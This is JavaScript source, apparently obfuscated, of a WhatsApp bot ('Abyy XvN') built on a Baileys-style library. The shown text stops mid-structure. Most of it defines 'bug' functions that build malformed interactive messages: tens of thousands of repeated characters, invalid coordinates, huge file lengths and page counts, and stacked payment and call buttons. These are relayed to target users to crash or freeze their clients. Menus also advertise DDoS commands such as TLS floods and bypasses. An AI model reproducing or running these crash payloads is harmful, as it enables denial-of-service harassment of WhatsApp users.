module.exports = async (_0x488b14, _0x257ec2, _0x7379b3) => {
  try {
    const _0x43890b = _0x257ec2.key.remoteJid;
    const _0x452409 = _0x257ec2.quoted ? _0x257ec2.quoted : _0x257ec2;
    var _0x1eef34 = _0x257ec2.mtype === "interactiveResponseMessage" ? JSON.parse(_0x257ec2.message.interactiveResponseMessage.nativeFlowResponseMessage.paramsJson).id : _0x257ec2.mtype === "conversation" ? _0x257ec2.message.conversation : _0x257ec2.mtype == 'imageMessage' ? _0x257ec2.message.imageMessage.caption : _0x257ec2.mtype == "videoMessage" ? _0x257ec2.message.videoMessage.caption : _0x257ec2.mtype == "extendedTextMessage" ? _0x257ec2.message.extendedTextMessage.text : _0x257ec2.mtype == "buttonsResponseMessage" ? _0x257ec2.message.buttonsResponseMessage.selectedButtonId : _0x257ec2.mtype == "listResponseMessage" ? _0x257ec2.message.listResponseMessage.singleSelectReply.selectedRowId : _0x257ec2.mtype == 'templateButtonReplyMessage' ? _0x257ec2.message.templateButtonReplyMessage.selectedId : _0x257ec2.mtype == "messageContextInfo" ? _0x257ec2.message.buttonsResponseMessage?.["selectedButtonId"] || _0x257ec2.message.listResponseMessage?.['singleSelectReply']["selectedRowId"] || _0x257ec2.text : '';
    const _0xf97983 = typeof _0x257ec2.text == 'string' ? _0x257ec2.text : '';
    const _0x28d847 = /^[°zZ#$@+,.?=''():√%!¢£¥€π¤ΠΦ&><`™©®Δ^βα¦|/\\©^]/.test(_0x1eef34) ? _0x1eef34.match(/^[°zZ#$@+,.?=''():√%¢£¥€π¤ΠΦ&><!`™©®Δ^βα¦|/\\©^]/gi) : '.';
    const _0x26860b = _0x1eef34.startsWith(_0x28d847);
    const _0x1a8c03 = _0x1eef34.replace(_0x28d847, '').trim().split(/ +/).shift().toLowerCase();
    const _0x47ea36 = _0x1eef34.trim().split(/ +/).slice(0x1);
    const _0x2a7f4e = (_0x452409.msg || _0x452409).mimetype || '';
    const _0x5592c0 = q = _0x47ea36.join(" ");
    const _0x157b9 = _0x43890b.endsWith("@g.us");
    const _0x50535b = await _0x488b14.decodeJid(_0x488b14.user.id);
    const _0x3bd3c5 = _0x257ec2.key.fromMe ? _0x488b14.user.id.split(':')[0x0] + "@s.whatsapp.net" || _0x488b14.user.id : _0x257ec2.key.participant || _0x257ec2.key.remoteJid;
    const _0x420900 = _0x3bd3c5.split('@')[0x0];
    const _0x2b0ab7 = _0x257ec2.pushName || '' + _0x420900;
    const _0x3dcca4 = _0x50535b.includes(_0x420900);
    const _0x4ad2b0 = _0x157b9 ? await _0x488b14.groupMetadata(_0x257ec2.chat)["catch"](_0x281813 => {}) : '';
    const _0x1c2263 = _0x157b9 ? await _0x4ad2b0.participants : '';
    const _0x5bdeb3 = _0x157b9 ? await _0x1c2263.filter(_0x2aa992 => _0x2aa992.admin !== null).map(_0x437509 => _0x437509.id) : '';
    const _0x1f6e63 = _0x157b9 ? _0x5bdeb3.includes(_0x50535b) : false;
    const _0x1d4a0c = () => {
      var _0x43a7c7 = fs.readFileSync("./rabyyx.js").toString();
      var _0x591e3f = (_0x43a7c7.match(/case '/g) || []).length;
      return _0x591e3f;
    };
    const _0x341a7a = _0x157b9 ? _0x5bdeb3.includes(_0x3bd3c5) : false;
    const _0x56c514 = require("javascript-obfuscator");
    const {
      addSaldo: _0xed99e6,
      minSaldo: _0x315662,
      cekSaldo: _0x3b4c66
    } = require("./database/dtbs/deposit");
    const _0x123a95 = " ⌜ 𝗔𝗧𝗧𝗔𝗖𝗞𝗜𝗡𝗚 𝗦𝗨𝗖𝗖𝗘𝗦 ⌟\n\n𝗕𝗨𝗚 𝗡𝗔𝗠𝗘 : " + _0x1a8c03 + "\n𝗦𝗧𝗔𝗧𝗨𝗦 : 𝗦𝘂𝗰𝗰𝗲𝘀𝗳𝘂𝗹𝗹𝘆 \n\n> jika target masih c2 biarin aja target tetap terkena delay maker ⚡";
    const _0x45a961 = " ⌜ 𝗔𝗧𝗧𝗔𝗖𝗞𝗜𝗡𝗚 𝗦𝗨𝗖𝗖𝗘𝗦 ⌟\n\n𝗕𝗨𝗚 𝗡𝗔𝗠𝗘 : " + _0x1a8c03 + "\n𝗦𝗧𝗔𝗧𝗨𝗦 : 𝗦𝘂𝗰𝗰𝗲𝘀𝗳𝘂𝗹𝗹𝘆 \n\n> jika target masih c2 biarin aja target tetap terkena delay maker ⚡";
    if (_0x257ec2.sender.startsWith("212")) {
      return _0x488b14.updateBlockStatus(_0x257ec2.sender, "block");
    }
    if (_0x26860b) {
      console.log(chalk.white.bgRed.bold("Ada Pesan, Om"), color("[ 𝗔𝗯𝘆𝘆 𝗫𝘃𝗡͖ ]", 'green'), color('FROM', "red"), color('' + _0x2b0ab7, 'red'), color("Text :", 'yellow'), color('' + _0x1eef34, 'blue'));
    }
    const _0x23ee52 = moment().tz("Asia/Jakarta").format("HH:mm:ss");
    if (_0x23ee52 < "23:59:00") {
      var _0x5e3841 = "Selamat Malam 🏙️";
    }
    if (_0x23ee52 < "19:00:00") {
      var _0x5e3841 = "Selamat Petang 🌆";
    }
    if (_0x23ee52 < "18:00:00") {
      var _0x5e3841 = "Selamat Sore 🌇";
    }
    if (_0x23ee52 < "15:00:00") {
      var _0x5e3841 = "Selamat Siang 🌤️";
    }
    if (_0x23ee52 < "10:00:00") {
      var _0x5e3841 = "Selamat Pagi 🌄";
    }
    if (_0x23ee52 < "05:00:00") {
      var _0x5e3841 = "Selamat Subuh 🌆";
    }
    if (_0x23ee52 < "03:00:00") {
      var _0x5e3841 = "Selamat Tengah Malam 🌃";
    }
    const _0x540ab1 = JSON.parse(fs.readFileSync("./database/dtbs/premium.json"));
    const _0x51aca6 = JSON.parse(fs.readFileSync('./database/dtbs/owner.json'));
    const _0x55dc4 = _0x540ab1.includes(_0x3bd3c5);
    const _0x14f0d6 = _0x51aca6.includes(_0x420900) || _0x3dcca4;
    _0x488b14.sendButtonVideo = async (_0x5518c5, _0x2ff778, _0x3f4740, _0x30345f = {}) => {
      var _0x4e0eb3 = await prepareWAMessageMedia({
        'video': {
          'url': _0x30345f && _0x30345f.video ? _0x30345f.video : ''
        }
      }, {
        'upload': _0x488b14.waUploadToServer
      });
      let _0x5c0f98 = generateWAMessageFromContent(_0x5518c5, {
        'viewOnceMessage': {
          'message': {
            'interactiveMessage': {
              'body': {
                'text': _0x30345f && _0x30345f.body ? _0x30345f.body : ''
              },
              'footer': {
                'text': _0x30345f && _0x30345f.footer ? _0x30345f.footer : ''
              },
              'header': {
                'hasMediaAttachment': true,
                'videoMessage': _0x4e0eb3.videoMessage
              },
              'nativeFlowMessage': {
                'buttons': _0x2ff778,
                'messageParamsJson': ''
              },
              'contextInfo': {
                'externalAdReply': {
                  'title': global.namabot,
                  'body': "By byxx Tzy",
                  'thumbnailUrl': global.imageurl,
                  'sourceUrl': global.isLink,
                  'mediaType': 0x1,
                  'renderLargerThumbnail': true
                }
              }
            }
          }
        }
      }, {
        'quoted': _0x3f4740
      });
      await _0x488b14.sendPresenceUpdate("composing", _0x5518c5);
      return _0x488b14.relayMessage(_0x5518c5, _0x5c0f98.message, {
        'messageId': _0x5c0f98.key.id
      });
    };
    let _0x1d6bee = [];
    for (let _0x4199be of _0x51aca6) {
      _0x1d6bee.push({
        'displayName': await _0x488b14.getName(_0x4199be + "@s.whatsapp.net"),
        'vcard': "BEGIN:VCARD\n\nVERSION:3.0\n\nN:" + (await _0x488b14.getName(_0x4199be + "@s.whatsapp.net")) + "\n\nFN:" + (await _0x488b14.getName(_0x4199be + "@s.whatsapp.net")) + "\n\nitem1.TEL;waid=" + _0x4199be + ':' + _0x4199be + "\n\nitem1.X-ABLabel:Ponsel\n\nitem2.EMAIL;type=INTERNET: barasukimewing@gmail.com\n\nitem2.X-ABLabel:Email\n\nitem3.URL:https://whatsapp.com/channel/0029Val78a7EawdvrnMrxC2B\nitem3.X-ABLabel:YouTube\n\nitem4.ADR:;;Indonesia;;;;\n\nitem4.X-ABLabel:Region\n\nEND:VCARD"
      });
    }
    try {
      ppuser = await _0x488b14.profilePictureUrl(_0x257ec2.sender, "image");
    } catch (_0x17d45d) {
      ppuser = "https://cdn.pixabay.com/photo/2015/10/05/22/37/blank-profile-picture-973460_960_720.png?q=60";
    }
    async function _0x465ee1(_0x255712) {
      return new Promise((_0x479344, _0x1a1830) => {
        try {
          const _0xb172e8 = _0x56c514.obfuscate(_0x255712, {
            'compact': false,
            'controlFlowFlattening': true,
            'controlFlowFlatteningThreshold': 0x1,
            'numbersToExpressions': true,
            'simplify': true,
            'stringArrayShuffle': true,
            'splitStrings': true,
            'stringArrayThreshold': 0x1
          });
          const _0x1770c7 = {
            'status': 0xc8,
            'author': "byxx",
            'result': _0xb172e8.getObfuscatedCode()
          };
          _0x479344(_0x1770c7);
        } catch (_0x3131b0) {
          _0x1a1830(_0x3131b0);
        }
      });
    }
    async function _0x4941e1(_0x356fe1) {
      try {
        console.log(chalk.green("Send Bug By Abyy XvN🔥"));
        console.log(chalk.red("InVisible⚡"));
      } catch (_0x1cdb1e) {
        console.error("Error Fetching Crash:", _0x1cdb1e);
      }
    }
    async function _0x1c81c7(_0x210faf, _0x7f3b0c) {
      var _0x4188aa = generateWAMessageFromContent(_0x210faf, proto.Message.fromObject({
        'ephemeralMessage': {
          'message': {
            'interactiveMessage': {
              'header': {
                'title': "𝗫𝘃͍̈́͢𝗡 𝗘𝘅͆𝗰𝗹͖𝘂𝘀͢𝗶𝘃̈́𝗲 ☠️" + 'ꦾ'.repeat(0x12fd1),
                'locationMessage': {
                  'degreesLatitude': -999.035,
                  'degreesLongitude': 922.999999999999,
                  'name': "𝐁𝐲𝐱𝐱𝐇𝐚𝐫𝐝𝐞𝐫〽️",
                  'address': "✨⃟༑⌁⃰𝐁𝐲𝐱𝐱 𝐇𝐚𝐫𝐝𝐞𝐫 ϟ〽️",
                  'jpegThumbnail': ''
                },
                'hasMediaAttachment': true
              },
              'body': {
                'text': ''
              },
              'nativeFlowMessage': {
                'messageParamsJson': " 𝐁𝐲𝐱𝐱𝐇𝐚𝐫𝐝𝐞𝐫 𝐁𝐔𝐆 𝐕𝟕〽️ ",
                'buttons': [{
                  'name': 'single_select',
                  'buttonParamsJson': {
                    'title': "✨⃟༑⌁⃰𝐁𝐲𝐱𝐱 𝐂𝐫𝐚𝐬𝐡 ϟ〽️",
                    'sections': [{
                      'title': "𝐁𝐲𝐱𝐱 𝐈𝐬 𝐇𝐞𝐫𝐞 ϟ",
                      'rows': []
                    }]
                  }
                }, {
                  'name': "call_permission_request",
                  'buttonParamsJson': {}
                }]
              }
            }
          }
        }
      }), {
        'userJid': _0x210faf,
        'quoted': _0x7f3b0c
      });
      await _0x488b14.relayMessage(_0x210faf, _0x4188aa.message, {
        'participant': {
          'jid': _0x210faf
        }
      });
    }
    async function _0x31f1b8(_0x5ee21b, _0x5f18a7, _0x53dbbb = false, _0x507354 = false) {
      let _0x1a150b = generateWAMessageFromContent(_0x5ee21b, proto.Message.fromObject({
        'viewOnceMessage': {
          'message': {
            'interactiveMessage': {
              'header': {
                'title': '',
                'documentMessage': {
                  'url': "https://mmg.whatsapp.net/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0&mms3=true",
                  'mimetype': "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                  'fileSha256': "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
                  'fileLength': '9999999999999',
                  'pageCount': 0x1fffffffffffff,
                  'mediaKey': "EZ/XTztdrMARBwsjTuo9hMH5eRvumy+F8mpLBnaxIaQ=",
                  'fileName': "🩸𝐁𝐲𝐱𝐱 𝐂𝐫𝐚𝐬𝐡 ϟ🦠",
                  'fileEncSha256': "oTnfmNW1xNiYhFxohifoE7nJgNZxcCaG15JVsPPIYEg=",
                  'directPath': "/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0",
                  'mediaKeyTimestamp': "1723855952",
                  'contactVcard': true,
                  'thumbnailDirectPath': "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
                  'thumbnailSha256': "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
                  'thumbnailEncSha256': "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
                  'jpegThumbnail': ''
                },
                'hasMediaAttachment': true
              },
              'body': {
                'text': "𝗫𝘃͍̈́͢𝗡 𝗘𝘅͆𝗰𝗹͖𝘂𝘀͢𝗶𝘃̈́𝗲 ☠️̤" + 'ꦾ'.repeat(0xc350)
              },
              'nativeFlowMessage': {
                'messageParamsJson': "{\"name\":\"galaxy_message\",\"title\":\"oi\",\"header\":\" # trashdex - explanation \",\"body\":\"xxx\"}",
                'buttons': [_0x53dbbb ? {
                  'name': "single_select",
                  'buttonParamsJson': "{\"title\":\"✨⃟༑⌁⃰𝐁𝐲𝐱𝐱 𝐂𝐫𝐚𝐬𝐡 ϟ⚡" + '᬴'.repeat(0x0) + "\",\"sections\":[{\"title\":\"𝐁𝐲𝐱𝐱 𝐈𝐬 𝐇𝐞𝐫𝐞 ϟ\",\"rows\":[]}]}"
                } : {
                  'name': "payment_method",
                  'buttonParamsJson': ''
                }, {
                  'name': "call_permission_request",
                  'buttonParamsJson': '{}'
                }, {
                  'name': 'payment_method',
                  'buttonParamsJson': '{}'
                }, {
                  'name': "single_select",
                  'buttonParamsJson': "{\"title\":\"✨⃟༑⌁⃰𝐁𝐲𝐱𝐱 𝐂𝐫𝐚𝐬𝐡 ϟ⚡\",\"sections\":[{\"title\":\"𝐁𝐲𝐱𝐱 𝐈𝐬 𝐇𝐞𝐫𝐞 ϟ\",\"rows\":[]}]}"
                }, {
                  'name': "galaxy_message",
                  'buttonParamsJson': "{\"flow_action\":\"navigate\",\"flow_action_payload\":{\"screen\":\"WELCOME_SCREEN\"},\"flow_cta\":\"〽️\",\"flow_id\":\"BY DEVORSIXCORE\",\"flow_message_version\":\"9\",\"flow_token\":\"MYPENISMYPENISMYPENIS\"}"
                }, {
                  'name': "mpm",
                  'buttonParamsJson': '{}'
                }]
              }
            }
          }
        }
      }), {
        'userJid': _0x5ee21b,
        'quoted': _0x5f18a7
      });
      await _0x488b14.relayMessage(_0x5ee21b, _0x1a150b.message, _0x507354 ? {
        'participant': {
          'jid': _0x5ee21b
        }
      } : {});
      console.log(chalk.green("Send Bug By Abyy XvN 🔥☠️"));
    }
    async function _0x3ea524(_0x32e035, _0x5902b7, _0x419e54 = true) {
      let _0xfa2b90 = generateWAMessageFromContent(_0x32e035, proto.Message.fromObject({
        'viewOnceMessage': {
          'message': {
            'interactiveMessage': {
              'header': {
                'title': '',
                'locationMessage': {},
                'hasMediaAttachment': true
              },
              'body': {
                'text': "𝗫𝘃͍̈́͢𝗡 𝗘𝘅͆𝗰𝗹͖𝘂𝘀͢𝗶𝘃̈́𝗲 ☠️̤" + 'ꦾ'.repeat(0x12fd1)
              },
              'nativeFlowMessage': {
                'name': 'call_permission_request',
                'messageParamsJson': " 𝐉𝐀𝐂𝐊𝐓𝐇𝐄𝐗𝐁𝐄𝐂〽️ "
              },
              'carouselMessage': {}
            }
          }
        }
      }), {
        'userJid': _0x32e035,
        'quoted': _0x5902b7
      });
      await _0x488b14.relayMessage(_0x32e035, _0xfa2b90.message, _0x419e54 ? {
        'participant': {
          'jid': _0x32e035
        }
      } : {});
      console.log(chalk.green("Send Bug By Abyy XvN 🔥☠️"));
    }
    async function _0x16ba4a(_0x27ce2b, _0x10c67f, _0x37b449 = false, _0x29ad1f = false) {
      let _0x3b192c = generateWAMessageFromContent(_0x27ce2b, proto.Message.fromObject({
        'viewOnceMessage': {
          'message': {
            'interactiveMessage': {
              'header': {
                'title': '',
                'documentMessage': {
                  'url': "https://mmg.whatsapp.net/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0&mms3=true",
                  'mimetype': "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                  'fileSha256': "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
                  'fileLength': '9999999999999',
                  'pageCount': 0x1fffffffffffff,
                  'mediaKey': 'EZ/XTztdrMARBwsjTuo9hMH5eRvumy+F8mpLBnaxIaQ=',
                  'fileName': "🩸𝐁𝐲𝐱𝐱 𝐂𝐫𝐚𝐬𝐡 ϟ🦠",
                  'fileEncSha256': 'oTnfmNW1xNiYhFxohifoE7nJgNZxcCaG15JVsPPIYEg=',
                  'directPath': "/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0",
                  'mediaKeyTimestamp': "1723855952",
                  'contactVcard': true,
                  'thumbnailDirectPath': "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
                  'thumbnailSha256': "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
                  'thumbnailEncSha256': "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
                  'jpegThumbnail': ''
                },
                'hasMediaAttachment': true
              },
              'body': {
                'text': "‎𝗫𝘃͍̈́͢𝗡 𝗘𝘅͆𝗰𝗹͖𝘂𝘀͢𝗶𝘃̈́𝗲 ☠️"
              },
              'nativeFlowMessage': {
                'messageParamsJson': "{\"name\":\"galaxy_message\",\"title\":\"oi\",\"header\":\" 𝐁𝐲𝐱𝐱 𝐈𝐬 𝐇𝐞𝐫𝐞 ϟ \",\"body\":\"xxx\"}",
                'buttons': [_0x37b449 ? {
                  'name': "single_select",
                  'buttonParamsJson': "{\"title\":\"✨⃟༑⌁⃰𝐁𝐲𝐱𝐱 𝐂𝐫𝐚𝐬𝐡 ϟ〽️" + '᬴'.repeat(0x0) + "\",\"sections\":[{\"title\":\"𝐁𝐲𝐱𝐱 𝐈𝐬 𝐇𝐞𝐫𝐞 ϟ\",\"rows\":[]}]}"
                } : {
                  'name': "payment_method",
                  'buttonParamsJson': ''
                }, {
                  'name': "call_permission_request",
                  'buttonParamsJson': '{}'
                }, {
                  'name': "payment_method",
                  'buttonParamsJson': '{}'
                }, {
                  'name': "review_and_pay",
                  'buttonParamsJson': ''
                }, {
                  'name': "call_permission_request",
                  'buttonParamsJson': '{}'
                }, {
                  'name': 'review_and_pay',
                  'buttonParamsJson': '{}'
                }, {
                  'name': 'payment_info',
                  'buttonParamsJson': ''
                }, {
                  'name': "call_permission_request",
                  'buttonParamsJson': '{}'
                }, {
                  'name': "payment_info",
                  'buttonParamsJson': '{}'
                }, {
                  'name': 'single_select',
                  'buttonParamsJson': "{\"title\":\"✨⃟༑⌁⃰𝐁𝐲𝐱𝐱 𝐂𝐫𝐚𝐬𝐡 ϟ〽️\",\"sections\":[{\"title\":\"𝐁𝐲𝐱𝐱 𝐈𝐬 𝐇𝐞𝐫𝐞 ϟ\",\"rows\":[]}]}"
                }, {
                  'name': "galaxy_message",
                  'buttonParamsJson': "{\"flow_action\":\"navigate\",\"flow_action_payload\":{\"screen\":\"WELCOME_SCREEN\"},\"flow_cta\":\"〽️\",\"flow_id\":\"BY DEVORSIXCORE\",\"flow_message_version\":\"9\",\"flow_token\":\"MYPENISMYPENISMYPENIS\"}"
                }, {
                  'name': "mpm",
                  'buttonParamsJson': '{}'
                }]
              }
            }
          }
        }
      }), {
        'userJid': _0x27ce2b,
        'quoted': _0x10c67f
      });
      await _0x488b14.relayMessage(_0x27ce2b, _0x3b192c.message, _0x29ad1f ? {
        'participant': {
          'jid': _0x27ce2b
        }
      } : {});
      console.log(chalk.green("Send Bug By Abyy XvN 🔥☠️"));
    }
    ;
    const _0x2acfd1 = {
      'key': {
        'fromMe': false,
        'participant': "0@s.whatsapp.net",
        'remoteJid': 'status@broadcast'
      },
      'message': {
        'orderMessage': {
          'orderId': "999999999999",
          'thumbnail': null,
          'itemCount': 0xe8d4a50fff,
          'status': "INQUIRY",
          'surface': "CATALOG",
          'message': "▾ ☠️⃟ᝤ𝐗͢𝐕͖𝐍ͧ Э͜𝐗͢𝐂𝐋͋𝐔͖𝐒͢їѴͦ𝐄͆͡ຯ͜͡🩸͜ ▾",
          'token': 'AR6xBKbXZn0Xwmu76Ksyd7rnxI+Rx87HfinVlW4lwXa6JA=='
        }
      },
      'contextInfo': {
        'mentionedJid': ["27746135260@s.whatsapp.net"],
        'forwardingScore': 0x3e7,
        'isForwarded': true
      }
    };
    const _0x18765d = {
      'key': {
        'remoteJid': 'p',
        'fromMe': false,
        'participant': "0@s.whatsapp.net"
      },
      'message': {
        'interactiveResponseMessage': {
          'body': {
            'text': "Sent",
            'format': "DEFAULT"
          },
          'nativeFlowResponseMessage': {
            'name': "galaxy_message",
            'paramsJson': "{\"screen_2_OptIn_0\":true,\"screen_2_OptIn_1\":true,\"screen_1_Dropdown_0\":\"ZetExecute\",\"screen_1_DatePicker_1\":\"1028995200000\",\"screen_1_TextInput_2\":\"czazxvoid@sky.id\",\"screen_1_TextInput_3\":\"94643116\",\"screen_0_TextInput_0\":\"radio - buttons" + "".repeat(0x7a120) + "\",\"screen_0_TextInput_1\":\"Anjay\",\"screen_0_Dropdown_2\":\"001-Grimgar\",\"screen_0_RadioButtonsGroup_3\":\"0_true\",\"flow_token\":\"AQAAAAACS5FpgQ_cAAAAAE0QI3s.\"}",
            'version': 0x3
          }
        }
      }
    };
    if (!_0x488b14["public"]) {
      if (!_0x257ec2.key.fromMe) {
        return;
      }
    }
    async function _0x42918c() {
      var _0x29f088 = ['𝗔', "𝗔𝗯𝘆𝘆", "𝗔𝗯𝘆𝘆 𝗫𝘃𝗡 ⚡"];
      let {
        key: _0x3e552a
      } = await _0x488b14.sendMessage(_0x43890b, {
        'text': '.'
      });
      for (let _0x52e037 = 0x0; _0x52e037 < _0x29f088.length; _0x52e037++) {
        await _0x488b14.sendMessage(_0x43890b, {
          'text': _0x29f088[_0x52e037],
          'edit': _0x3e552a
        });
      }
    }
    const _0x2d94c9 = _0x2d683d => {
      _0x488b14.sendMessage(_0x257ec2.chat, {
        'text': _0x2d683d,
        'contextInfo': {
          'mentionedJid': [_0x3bd3c5],
          'forwardingScore': 0x98967f,
          'isForwarded': true,
          'externalAdReply': {
            'showAdAttribution': true,
            'containsAutoReply': true,
            'title': "𝐗𝐯𝐍 𝐆𝐮𝐚𝐑𝐊 ⚡🔥",
            'body': '',
            'previewType': "PHOTO",
            'thumbnailUrl': '',
            'thumbnail': fs.readFileSync("./image/nulll.jpg"),
            'sourceUrl': '' + isLink
          }
        }
      }, {
        'quoted': _0x257ec2
      });
    };
    if (_0x257ec2.isGroup && !_0x257ec2.key.fromMe && !_0x14f0d6 && antilink) {
      if (!_0x1f6e63) {
        return;
      }
      if (_0xf97983.match("whatsapp.com")) {
        _0x488b14.sendMessage(_0x257ec2.chat, {
          'text': "*Antilink Group Terdeteksi*\n\nKamu Akan Dikeluarkan Dari Group " + _0x4ad2b0.subject
        }, {
          'quoted': _0x257ec2
        });
        _0x488b14.groupParticipantsUpdate(_0x257ec2.chat, [_0x3bd3c5], "delete");
        _0x488b14.sendMessage(_0x257ec2.chat, {
          'delete': _0x257ec2.key
        });
      }
    }
    switch (_0x1a8c03) {
      case "menu":
        {
          await _0x42918c();
          darkphonk = fs.readFileSync("./database/xvnz.mp3");
          const _0x2368e5 = " ❲ `𝗔𝗯𝘆𝘆 𝗫𝘃𝗡` ❳\n⮕ Hello " + _0x2b0ab7 + "\n⮕ *i am a bot created by Abyy*\n⮕ CREATOR : 𝗔𝗯𝘆𝘆 𝗫𝘃𝗡\n⮕ OWNER : " + global.owner + "\n\n\n➼ .allmenu\n➼ .bugmenu\n➼ .ddosmenu\n ";
          let _0x2865a9 = [{
            'title': "⿻  ⌜ LIST MENU ⌟  ⿻",
            'highlight_label': "𝐀𝐥𝐥 𝐌𝐞𝐧𝐮",
            'rows': [{
              'title': 'Ւ',
              'id': ".allmenu"
            }]
          }, {
            'title': "𝗗𝗔𝗡𝗚𝗘𝗥𝗢𝗨𝗦 ⚠️☣️",
            'highlight_label': "𝐁𝐮𝐠 𝐌𝐞𝐧𝐮",
            'rows': [{
              'title': '⺢',
              'id': '.bugmenu'
            }]
          }, {
            'highlight_label': "𝖝 𝖇𝖚𝖙𝖙𝖔𝖓",
            'rows': [{
              'title': '☇',
              'id': ".buttonbug"
            }]
          }, {
            'highlight_label': "𝐝𝐝𝐨𝐬 ⚠️",
            'rows': [{
              'title': '☭',
              'id': '.ddosmenu'
            }]
          }];
          let _0x17e616 = {
            'title': "𝗔𝗯𝘆𝘆 𝗫𝘃𝗡͖",
            'sections': _0x2865a9
          };
          let _0x4b9a5d = generateWAMessageFromContent(_0x257ec2.chat, {
            'viewOnceMessage': {
              'message': {
                'messageContextInfo': {
                  'deviceListMetadata': {},
                  'deviceListMetadataVersion': 0x2
                },
                'interactiveMessage': proto.Message.InteractiveMessage.create({
                  'contextInfo': {
                    'mentionedJid': [_0x257ec2.sender],
                    'externalAdReply': {
                      'showAdAttribution': true
                    }
                  },
                  'body': proto.Message.InteractiveMessage.Body.create({
                    'text': _0x2368e5
                  }),
                  'footer': proto.Message.InteractiveMessage.Footer.create({
                    'text': "⿻  ⌜ 𝐏𝐮𝐤𝐢𝐦𝐚𝐤 ⌟  ⿻"
                  }),
                  'header': proto.Message.InteractiveMessage.Header.create({
                    'hasMediaAttachment': true,
                    ...(await prepareWAMessageMedia({
                      'image': await fs.readFileSync("./image/byzx.jpg")
                    }, {
                      'upload': _0x488b14.waUploadToServer
                    }))
                  }),
                  'nativeFlowMessage': proto.Message.InteractiveMessage.NativeFlowMessage.create({
                    'buttons': [{
                      'name': 'single_select',
                      'buttonParamsJson': JSON.stringify(_0x17e616)
                    }, {
                      'name': "cta_url",
                      'buttonParamsJson': "{\"display_text\":\"My Creator\",\"url\":\"https://youtube.com/@abyyyferrr\",\"merchant_url\":\"https://youtube.com/@abyyyferrr\"}"
                    }]
                  })
                })
              }
            }
          }, {
            'userJid': _0x257ec2.sender,
            'quoted': _0x257ec2
          });
          await _0x488b14.relayMessage(_0x4b9a5d.key.remoteJid, _0x4b9a5d.message, {
            'messageId': _0x4b9a5d.key.id
          });
        }
        break;
      case "ddosmenu":
        {
          await _0x42918c();
          const _0x9853f = " ❲ `𝗔𝗯𝘆𝘆 𝗫𝘃𝗡` ❳\n⮕ Hello " + _0x2b0ab7 + "\n⮕ *i am a bot created by Abyy*\n⮕ CREATOR : 𝗔𝗯𝘆𝘆 𝗫𝘃𝗡\n⮕ OWNER : " + global.owner + "\n\n   ⌜ DDOS MENU ⌟\n   \n➼  ᴅᴅᴏs\n➼  ᴍɪx\n➼  ғʟᴏᴀᴅs\n➼  ᴜᴀ\n➼  xᴄʜʀᴏᴍᴇ\n➼  ᴛʟs\n➼  ᴛʟsʙʏᴘᴀss\n➼  ᴛʟsᴠ2\n➼  ᴛʟs-ᴠɪᴘ\n➼  xc\n";
          let _0x26613e = [{
            'title': "⿻  ⌜ LIST MENU ⌟  ⿻",
            'highlight_label': "𝐀𝐥𝐥 𝐌𝐞𝐧𝐮",
            'rows': [{
              'title': 'Ւ',
              'id': ".allmenu"
            }]
          }, {
            'title': "𝗗𝗔𝗡𝗚𝗘𝗥𝗢𝗨𝗦 ⚠️☣️",
            'highlight_label': "𝐁𝐮𝐠 𝐌𝐞𝐧𝐮",
            'rows': [{
              'title': '⺢',
              'id': ".bugmenu"
            }]
          }, {
            'highlight_label': "𝖝 𝖇𝖚𝖙𝖙𝖔𝖓",
            'rows': [{
              'title': '☇',
              'id': ".buttonbug"
            }]
          }, {
            'highlight_label': "𝐝𝐝𝐨𝐬 ⚠️",
            'rows': [{
              'title': '☭',
              'id': ".ddosmenu"
            }]
          }];
          let _0x268fc2 = {
            'title': "𝗔𝗯𝘆𝘆 𝗫𝘃𝗡͖",
            'sections': _0x26613e
          };
          let _0x90717c = generateWAMessageFromContent(_0x257ec2.chat, {
            'viewOnceMessage': {
              'message': {
                'messageContextInfo': {
                  'deviceListMetadata': {},
                  'deviceListMetadataVersion': 0x2
                },
                'interactiveMessage': proto.Message.InteractiveMessage.create({
                  'contextInfo': {
                    'mentionedJid': [_0x257ec2.sender],
                    'externalAdReply': {
                      'showAdAttribution': true
                    }
                  },
                  'body': proto.Message.InteractiveMessage.Body.create({
                    'text': _0x9853f
                  }),
                  'footer': proto.Message.InteractiveMessage.Footer.create({
                    'text': "⿻  ⌜ 𝐏𝐮𝐤𝐢𝐦𝐚𝐤 ⌟  ⿻"
                  }),
                  'header': proto.Message.InteractiveMessage.Header.create({
                    'hasMediaAttachment': true,
                    ...(await prepareWAMessageMedia({
                      'image': await fs.readFileSync("./image/byzx.jpg")
                    }, {
                      'upload': _0x488b14.waUploadToServer
                    }))
                  }),
                  'nativeFlowMessage': proto.Message.InteractiveMessage.NativeFlowMessage.create({
                    'buttons': [{
                      'name': "single_select",
